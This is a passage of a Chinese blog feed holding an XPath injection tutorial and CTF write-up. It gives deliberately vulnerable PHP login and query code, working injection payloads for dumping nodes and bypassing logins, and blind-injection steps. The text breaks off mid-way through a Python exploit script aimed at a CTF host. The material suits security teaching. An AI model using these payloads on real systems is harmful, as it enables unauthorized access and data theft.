pan><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 比赛WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XPATH注入</title>
      <link href="/2022/09/17/xpath-zhu-ru/"/>
      <url>/2022/09/17/xpath-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="XPATH注入"><a href="#XPATH注入" class="headerlink" title="XPATH注入"></a>XPATH注入</h2><h2 id="XPATH"><a href="#XPATH" class="headerlink" title="XPATH"></a>XPATH</h2><p>XPATH语法 <a href="https://www.w3school.com.cn/xpath/xpath_syntax.asp">https://www.w3school.com.cn/xpath/xpath_syntax.asp</a> </p><p> XPath即为XML路径语言，它是一种用来确定XML（标准通用标记语言的子集）文档中某部分位置的语言。XPath基于XML的树状结构，有不同类型的节点，包括元素节点，属性节点和文本节点，提供在数据结构树中找寻节点的能力 </p><h2 id="XPATH注入原理"><a href="#XPATH注入原理" class="headerlink" title="XPATH注入原理"></a>XPATH注入原理</h2><p>XPath 注入利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得高权限信息的访问权。</p><p><strong>XPath注入类似于SQL注入</strong>，当网站使用未经正确处理的用户输入查询 XML 数据时，可能发生 XPATH 注入，由于Xpath中数据不像SQL中有权限的概念，用户可通过提交恶意XPATH代码获取到完整xml文档数据</p><h2 id="Xpath和Xquery语法："><a href="#Xpath和Xquery语法：" class="headerlink" title="Xpath和Xquery语法："></a>Xpath和Xquery语法：</h2><ul><li>“nodename” – 选取nodename的所有子节点</li><li>“&#x2F;nodename” – 从根节点中选择</li><li>“&#x2F;&#x2F;nodename” – 从当前节点选择</li><li>“..” – 选择当前节点的父节点</li><li>“child::node()” – 选择当前节点的所有子节点</li><li>“@” -选择属性</li><li>“&#x2F;&#x2F;user[position()&#x3D;2] “ 选择节点位置</li></ul><h2 id="XPATH注入之常规注入"><a href="#XPATH注入之常规注入" class="headerlink" title="XPATH注入之常规注入"></a>XPATH注入之常规注入</h2><p> index.php </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'t3stt3st.xml'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'t3stt3st.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"user/username[@name='"</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token operator">.</span><span class="token string double-quoted-string">"']"</span><span class="token punctuation">;</span><span class="token variable">$ans</span> <span class="token operator">=</span> <span class="token variable">$xml</span><span class="token operator">-></span><span class="token function">xpath</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$ans</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=></span> <span class="token variable">$x_value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token operator">.</span><span class="token string double-quoted-string">":  "</span> <span class="token operator">.</span> <span class="token variable">$x_value</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>t3stt3st.xml:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>user1<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>user1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>KEY:1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>user2<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>user2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>KEY:2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>user3<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>user3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>KEY:3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>user4<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>user4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>KEY:4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>user5<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>user5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>KEY:5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>user6<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>user6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>KEY:6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>user7<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>user7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>KEY:7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>user8<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>user8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>KEY:8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>user9<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>user9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>KEY:9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hctfadmin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>hctf1<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>hctf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>key</span><span class="token punctuation">></span></span>flag:hctf&#123;Dd0g_fac3_t0_k3yboard233&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hctfadmin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root1</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 正常查询： <a href="http://127.0.0.1/xpath/index.php?user=user1">http://127.0.0.1/xpath/index.php?user=user1</a> </p><p><img src="/images/image-20220917204019710.png" alt="image-20220917204019710"></p><h2 id="Xpath注入漏洞验证："><a href="#Xpath注入漏洞验证：" class="headerlink" title="Xpath注入漏洞验证："></a><strong>Xpath注入漏洞验证：</strong></h2><p><strong>加一个 <code>&#39;</code> 有下列报错</strong>，则可以确定Xpath注入的存在性</p><p><img src="/images/image-20220917204033874.png" alt="image-20220917204033874"></p><p> 构造Xpath注入语句： </p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">user1&#39; or 1&#x3D;1 or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时的查询语句</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"user/username[@name='user1' or 1=1 or ''='']"</span><span class="token punctuation">;</span><span class="token comment">##1=1为真 ''='' 为真，使用or连接，则可以匹配当前节点下的所有user</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 结果： </p><p><img src="/images/image-20220917205233640.png" alt="image-20220917205233640"></p><p> 使用’ or 1&#x3D;1 or ‘’&#x3D;’ 只能获取当前节点下的数据，flag不在当前节点中。而这里既然为ctf题目，肯定是需要获取flag的，这里xpath有一个类似于sqli的’or ‘1’&#x3D;’1的paylaod </p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;]|&#x2F;&#x2F;*|&#x2F;&#x2F;*[&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 该paylaod用于访问xml文档的所有节点 </p><p><img src="/images/image-20220917205434032.png" alt="image-20220917205434032"></p><h2 id="Xpath注入之登录绕过"><a href="#Xpath注入之登录绕过" class="headerlink" title="Xpath注入之登录绕过"></a>Xpath注入之登录绕过</h2><p>login.php:</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;title&gt;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;form method&#x3D;&quot;POST&quot;&gt;username：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;&#x2F;p&gt;password：&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;&lt;&#x2F;p&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot; name&#x3D;&quot;submit&quot;&gt;&lt;&#x2F;p&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?phpif(file_exists(&#39;test.xml&#39;))&#123;$xml&#x3D;simplexml_load_file(&#39;test.xml&#39;);if($_POST[&#39;submit&#39;])&#123;$username&#x3D;$_POST[&#39;username&#39;];$password&#x3D;$_POST[&#39;password&#39;];$x_query&#x3D;&quot;&#x2F;accounts&#x2F;user[username&#x3D;&#39;&#123;$username&#125;&#39; and password&#x3D;&#39;&#123;$password&#125;&#39;]&quot;;$result &#x3D; $xml-&gt;xpath($x_query);if(count($result)&#x3D;&#x3D;0)&#123;echo &#39;登录失败&#39;;&#125;else&#123;echo &quot;登录成功&quot;;$login_user &#x3D; $result[0]-&gt;username;echo &quot;you login as $login_user&quot;;&#125;&#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>test.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>accounts</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>Twe1ve<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>admin@xx.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>accounttype</span><span class="token punctuation">></span></span>administrator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>accounttype</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>P@ssword123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>tw@xx.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>accounttype</span><span class="token punctuation">></span></span>normal<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>accounttype</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>accounts</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里，test为普通账户，Twe1ve为管理账户（不设置为admin，为了更直观地看出权限时用户名已知和未知的区别，也是模拟用户名不为admin的情况）<br>test用户使用正确的账户名密码正常登录：</p><p><img src="/images/image-20220917205629013.png" alt="image-20220917205629013"></p><p>用户名：test’ or ‘a’&#x3D;’a 密码随意</p><p><img src="/images/image-20220917205644986.png" alt="image-20220917205644986"></p><p>这意味着知道任意用户名即可以该用户身份登录，在已知用户账户名的情况下实现任意用户登录。假若管理员用户未知，如我这里设置的比较奇葩的管理用户名，还可以实现以管理员身份登录吗？我们知道一般数据库中默认第一个用户为管理用户。所以这里类似SQLi 的万能密码，使用如下paylaod实现在管理账户未知的情况下管理员登录：</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">x&#39; or 1&#x3D;1 or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果：</p><p><img src="/images/image-20220917205701500.png" alt="image-20220917205701500"></p><h2 id="Xpath盲注"><a href="#Xpath盲注" class="headerlink" title="Xpath盲注"></a>Xpath盲注</h2><p><strong>Xpath盲注步骤：</strong></p><ul><li>判断根节点下的节点数</li><li>判断根节点下节点长度&amp;名称</li><li>…..</li><li>重复猜解完所有节点，获取最后的值</li></ul><p>美团CTF <strong>babyjava</strong> </p><p><img src="/images/image-20220917210817216.png" alt="image-20220917210817216"></p><p>验证：</p><p>输入 <code>user&#39;</code></p><p><img src="/images/image-20220917211010404.png" alt="image-20220917211010404"></p><p>存在Xpath漏洞</p><p>从根节点开始判断：</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or count(&#x2F;)&#x3D;1  and &#39;&#39;&#x3D;&#39;     ###根节点数量为1&#39;or count(&#x2F;*)&#x3D;1 and &#39;&#39;&#x3D;&#39;   ##根节点下只有一个子节点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>判断根节点下的节点长度为4：</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or string-length(name(&#x2F;*[1]))&#x3D;4 and &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>猜解根节点下的节点名称：</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or substring(name(&#x2F;*[1]), 1, 1)&#x3D;&#39;r&#39;  and &#39;&#39;&#x3D;&#39;&#39;or substring(name(&#x2F;*[1]), 2, 1)&#x3D;&#39;o&#39;  and &#39;&#39;&#x3D;&#39;&#39;or substring(name(&#x2F;*[1]), 3, 1)&#x3D;&#39;o&#39;  and &#39;&#39;&#x3D;&#39;&#39;or substring(name(&#x2F;*[1]), 4, 1)&#x3D;&#39;t&#39;  and &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>猜解出该节点名称为root</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or count(&#x2F;root)&#x3D;1  and &#39;&#39;&#x3D;&#39;   &#x2F;root节点数量为1&#39;or count(&#x2F;root&#x2F;user&#x2F;*)&gt;0 and &#39;&#39;&#x3D;&#39;     &#x2F;root下有两个节点&#39;or string-length(name(&#x2F;root&#x2F;*[1]))&#x3D;4  and &#39;&#39;&#x3D;&#39;    第一个子节点长度为4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>猜解root下的节点名称：</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or substring(name(&#x2F;root&#x2F;*[1]), 1, 1)&#x3D;&#39;u&#39;  and &#39;&#39;&#x3D;&#39;...&#39;or substring(name(&#x2F;root&#x2F;*[1]), 4, 1)&#x3D;&#39;r&#39;  and &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>root下子节点名称为user</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or count(&#x2F;root&#x2F;user)&#x3D;2  and &#39;&#39;&#x3D;&#39;    #user节点有两个，则可以猜测出accounts节点结构，accounts下两个节点，均为user节点<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一个user节点的子节点长度为8：</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or string-length(name(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;*[1]))&#x3D;8 and &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取user节点的下子节点</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or substring(name(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;*[1]), 1, 1)&#x3D;&#39;u&#39;  and &#39;&#39;&#x3D;&#39;&#39;or substring(name(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;*[1]), 2, 1)&#x3D;&#39;s&#39;  and &#39;&#39;&#x3D;&#39;...&#39;or substring(name(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;*[1]), 8, 1)&#x3D;&#39;e&#39;  and &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最终所有子节点值验证如下：</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or substring(name(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;*[1]), 1)&#x3D;&#39;username&#39;  and &#39;&#39;&#x3D;&#39;&#39;or substring(name(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;*[2]), 1)&#x3D;&#39;username&#39;  and &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>继续猜解：</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or count(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;username&#x2F;*)&gt;0 and &#39;&#39;&#x3D;&#39;   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>均为 false，不再有子节点，则可以尝试读取这些节点的值</p><p>最后结构</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">root  1 len:4 user     2 len:8 username        len:8 username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>user下的第一个username值长度为6:</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or string-length((&#x2F;&#x2F;user[position()&#x3D;1]&#x2F;username[position()&#x3D;1]))&#x3D;6  and &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取第一个user下usernaem的值</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or substring((&#x2F;&#x2F;user[position()&#x3D;1]&#x2F;username[position()&#x3D;1]),1,1)&#x3D;&#39;T&#39;  and &#39;&#39;&#x3D;&#39;....&#39;or substring((&#x2F;&#x2F;user[position()&#x3D;1]&#x2F;username[position()&#x3D;1]),6,1)&#x3D;&#39;e&#39;  and &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可依次读取所有的子节点的值，第二user节点的子节点值读取方式：</p><pre class="line-numbers language-hxml" data-language="hxml"><code class="language-hxml">&#39;or string-length((&#x2F;&#x2F;user[position()&#x3D;2]&#x2F;username[position()&#x3D;1]))&#x3D;4 and &#39;&#39;&#x3D;&#39;  #第一个user下的username长度为4......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>重复上边步骤即可</p><p>利用脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://eci-2zegwb2qirhal23opwv4.cloudeci1.ichunqiu.com:8888/hello"</span><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'xpath'</span><span class="token punctuation">:</span>payload    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getRootCnt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"'or count(/)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">  and ''='"</span></span>        r<span class="token operator">=</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getRootCnt'</span><span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">getSecondCnt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"'or count(/*)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> and ''='"</span></span>        r<span class="token operator">=</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getSecondCnt'</span><span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">getRootnameLen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"'or string-length(name(/*[1]))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> and ''='"</span></span>        r <span class="token operator">=</span> send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getRootnameLen'</span> <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">getRootname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span 